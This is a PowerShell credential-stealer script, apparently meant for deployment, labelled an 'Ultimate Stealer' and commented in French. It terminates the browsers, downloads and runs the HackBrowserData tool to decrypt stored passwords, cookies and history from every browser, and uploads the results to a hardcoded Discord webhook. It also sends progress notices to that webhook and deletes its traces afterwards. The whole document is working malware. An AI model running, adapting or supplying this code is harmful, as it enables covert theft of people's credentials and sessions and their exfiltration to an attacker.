# HackBrowserData Ultimate Stealer - COMPLETE VERSION
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Notification de démarrage
irm $wh -Method Post -Body (@{content="🟢 Script started on **$env:COMPUTERNAME** by **$env:USERNAME**"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

# Kill browsers
taskkill /F /IM chrome.exe 2>$null
taskkill /F /IM msedge.exe 2>$null
taskkill /F /IM firefox.exe 2>$null
taskkill /F /IM brave.exe 2>$null
taskkill /F /IM opera.exe 2>$null
Start-Sleep -Seconds 2

# Aller dans TEMP
cd $env:TEMP

# Nettoyer les anciens fichiers
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

# Notification téléchargement
irm $wh -Method Post -Body (@{content="📥 Downloading HackBrowserData..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

# Télécharger HackBrowserData
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile hbd.zip -UseBasicParsing
    
    # Notification extraction
    irm $wh -Method Post -Body (@{content="📦 Extracting..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    
    # Extraire
    Expand-Archive hbd.zip -DestinationPath HBD -Force
    cd HBD
    
    # Notification exécution
    irm $wh -Method Post -Body (@{content="🔓 Decrypting browser data..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    
    # Exécuter HackBrowserData (déchiffre TOUT)
    .\hack-browser-data.exe --browser all --format json --dir output --zip 2>$null
    
    Start-Sleep -Seconds 2
    
    # Vérifier si results.zip a été créé
    if (Test-Path "results.zip") {
        $fileSize = (Get-Item "results.zip").Length / 1KB
        
        # Notification upload
        irm $wh -Method Post -Body (@{content="📤 Uploading data ($([math]::Round($fileSize, 2)) KB)..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
        
        # Upload vers Discord
        curl.exe -F "file=@results.zip" -F "content=**✅ HackBrowserData from $env:COMPUTERNAME**`n**User:** $env:USERNAME`n**Size:** $([math]::Round($fileSize, 2)) KB`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
        
        # Notification succès
        irm $wh -Method Post -Body (@{content="✅ Upload complete! Cleaning up..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    } else {
        # Erreur : pas de results.zip
        irm $wh -Method Post -Body (@{content="❌ ERROR: results.zip not found"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
        
        # Essayer d'envoyer le dossier output entier
        if (Test-Path "output") {
            Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
            curl.exe -F "file=@manual.zip" -F "content=**Fallback data from $env:COMPUTERNAME**" $wh
        }
    }
    
} catch {
    # Notification d'erreur
    $errorMsg = $_.Exception.Message
    irm $wh -Method Post -Body (@{content="❌ ERROR: $errorMsg"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
}

# Cleanup (nettoyage des traces)
cd ..
Start-Sleep -Seconds 3
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

# Notification fin
irm $wh -Method Post -Body (@{content="🧹 Cleanup complete. Script finished."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

